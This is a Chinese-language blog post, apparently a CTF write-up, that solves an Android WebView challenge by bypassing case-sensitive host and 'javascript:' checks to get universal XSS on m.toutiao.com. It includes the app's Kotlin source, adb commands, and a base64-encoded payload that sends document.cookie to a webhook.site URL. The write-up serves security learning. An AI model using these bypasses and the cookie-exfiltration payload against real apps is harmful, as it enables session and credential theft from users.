<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>byteinner secreturl</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="./index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="./about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./byteinner secreturl.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">byteinner secreturl</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-05-17]</div>
    </header>
    <div class="layout-grid">
                <main><h2 id="ti-mu">题目</h2><p><code>MainActivity.kt</code>
接收intent传的<code>url</code>参数然后加载url，限制不能以<code>.toutiao.com</code>结尾
重写了<code>shouldOverrideUrlLoading</code>和<code>onPageFinished</code>方法，页面刷新时获取monitor参数，限制不能以<code>javascript:</code>开头，页面主文档加载完成后发现monitor不为空则加载monitor网页</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">package com.security.secreturl
</span><span style="color:#c0c5ce;">import ...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">class MainActivity : ComponentActivity() {
</span><span style="color:#c0c5ce;">    private lateinit var webview: WebView
</span><span style="color:#c0c5ce;">    override fun onCreate(savedInstanceState: Bundle?) {
</span><span style="color:#c0c5ce;">        super.onCreate(savedInstanceState)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        var monitor = &quot;&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        setContentView(R.layout.layout)
</span><span style="color:#c0c5ce;">        webview = findViewById(R.id.show)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        webview.settings.javaScriptEnabled = true
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        webview.setWebChromeClient(object : WebChromeClient() {
</span><span style="color:#c0c5ce;">            override fun onConsoleMessage(message: String, lineNumber: Int, sourceID: String?) {
</span><span style="color:#c0c5ce;">                Log.e(&quot;SecretUrl&quot;, message)
</span><span style="color:#c0c5ce;">                super.onConsoleMessage(message, lineNumber, sourceID)
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        })
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        webview.setWebViewClient(object : WebViewClient() {
</span><span style="color:#c0c5ce;">            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
</span><span style="color:#c0c5ce;">                val _url = url.toUri().getQueryParameter(&quot;monitor&quot;)
</span><span style="color:#c0c5ce;">                if (_url != null &amp;&amp; !_url.startsWith(&quot;javascript:&quot;)) {
</span><span style="color:#c0c5ce;">                    Log.i(&quot;SecretUrl&quot;, url.toUri().getQueryParameter(&quot;SecretUrl&quot;).toString())
</span><span style="color:#c0c5ce;">                    monitor = _url
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">                else{
</span><span style="color:#c0c5ce;">                    Log.e(&quot;SecretUrl&quot;, url.toUri().getQueryParameter(&quot;SecretUrl&quot;).toString())
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">                return super.shouldOverrideUrlLoading(view, url)
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            override fun onPageFinished(view: WebView, url: String) {
</span><span style="color:#c0c5ce;">                if (monitor != &quot;&quot;) {
</span><span style="color:#c0c5ce;">                    Log.i(&quot;SecretUrl&quot;, monitor)
</span><span style="color:#c0c5ce;">                    webview.loadUrl(monitor)
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            override fun onReceivedSslError(
</span><span style="color:#c0c5ce;">                view: WebView,
</span><span style="color:#c0c5ce;">                handler: SslErrorHandler,
</span><span style="color:#c0c5ce;">                error: SslError
</span><span style="color:#c0c5ce;">            ) {
</span><span style="color:#c0c5ce;">                handler.proceed()
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        })
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        if (intent.hasExtra(&quot;url&quot;)) {
</span><span style="color:#c0c5ce;">            val url = intent.getStringExtra(&quot;url&quot;)!!
</span><span style="color:#c0c5ce;">            val uri = url.toUri()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            if (uri.host != null &amp;&amp; !uri.host!!.endsWith(&quot;.toutiao.com&quot;)) {
</span><span style="color:#c0c5ce;">                webview.loadUrl(url)
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>FlagReceiver.kt</code>
设置flag在cookie中，且设置<code>Domain=m.toutiao.com</code>，需要在toutiao这个域下执行才能获取到flag</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">package com.security.secreturl
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">import ...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">class FlagReceiver : BroadcastReceiver() {
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    override fun onReceive(context: Context, intent: Intent) {
</span><span style="color:#c0c5ce;">        val flag = intent.getStringExtra(&quot;flag&quot;)
</span><span style="color:#c0c5ce;">        if (flag!= null){
</span><span style="color:#c0c5ce;">            val cookie = &quot;flag=$flag; Domain=m.toutiao.com; Path=/; SameSite=Strict; Expires=Wed, 1 Jan 2030 00:00:00 GMT&quot;
</span><span style="color:#c0c5ce;">            val cookieManager = CookieManager.getInstance()
</span><span style="color:#c0c5ce;">            cookieManager.setCookie(&quot;https://m.toutiao.com&quot;, cookie)
</span><span style="color:#c0c5ce;">            cookieManager.flush()
</span><span style="color:#c0c5ce;">            Log.e(&quot;FlagReceiver&quot;, &quot;received flag.&quot;)
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="uxss-universal-cross-site-scriting">UXSS（universal cross-site scriting）</h2><p><a href="https://security.tencent.com/index.php/blog/msg/70">Android Webview UXSS 漏洞攻防</a></p>
<p>UXSS是一种利用浏览器或浏览器扩展漏洞来制造产生XSS并执行代码的一种攻击类型
对于本题 目标就是利用uxss在m.toutiao.com域下获取cookie中的flag</p>
<h2 id="jie-ti">解题</h2><p>首先对于题目中对域名的过滤 可以通过大小写绕过
对于第一处对url的过滤，使用<code>http://M.TOUTIAO.COM</code>即可绕过
对于第二处对monitor的过滤，使用<code>jAvascript:</code>即可绕过</p>
<p><code>javascript:</code>协议，能够在url中嵌入javascript代码并且运行。当浏览器遇到遇到，会将冒号之后的代码提取出来并在当前页面环境执行</p>
<p>从而就能够在目标域下执行任意js代码了，接下来就只需要获取flag并且发送出来即可，可以看到此时域这个条件已经满足了</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">(base) ayoung@ayoungmbp app % adb shell am start -n com.security.secreturl/.MainActivity -W -e url &quot;http://M.TOUTIAO.COM/?monitor=jAvascript:alert\(document.domain\)&quot;
</span></pre>
<p><img src="./images/Pasted%20image%2020250517171850.png" alt="" /></p>
<p>本地使用android studio启动app，先广播本地设置flag</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">adb shell am broadcast -W -a com.bytectf.SET_FLAG -n com.security.secreturl/.FlagReceiver --es flag &quot;FLAG{test_flag_123}&quot;
</span></pre>
<p>最后发现命令行直接执行会有一些编码的问题，使用base64先编码一下js代码</p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">fetch</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">https://webhook.site/469534d2-817c-4e94-9cb0-e93078b1fa7b?flag=</span><span style="color:#c0c5ce;">&#39;+</span><span style="color:#96b5b4;">encodeURIComponent</span><span style="color:#c0c5ce;">(document.cookie))
</span></pre>
<p>使用webhook因为发现apk原生限制了只能fetch https链接
原本尝试用自己vps的时候，http链接 logcat显示：This request has been blocked; the content must be served over HTTPS。</p>
<p>完整利用url</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">adb shell am start -n com.security.secreturl/.MainActivity -W -e url &quot;http://M.TOUTIAO.COM/?monitor=jAvascript:eval%28atob%28%27ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzQ2OTUzNGQyLTgxN2MtNGU5NC05Y2IwLWU5MzA3OGIxZmE3Yj9mbGFnPScrZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSkp%27%29%29&quot;
</span></pre>
<p><img src="./images/Pasted%20image%2020250517173348.png" alt="" /></p>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ti-mu">题目</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#uxss-universal-cross-site-scriting">UXSS（universal cross-site scriting）</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#jie-ti">解题</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="script.js"></script>
</body>
</html>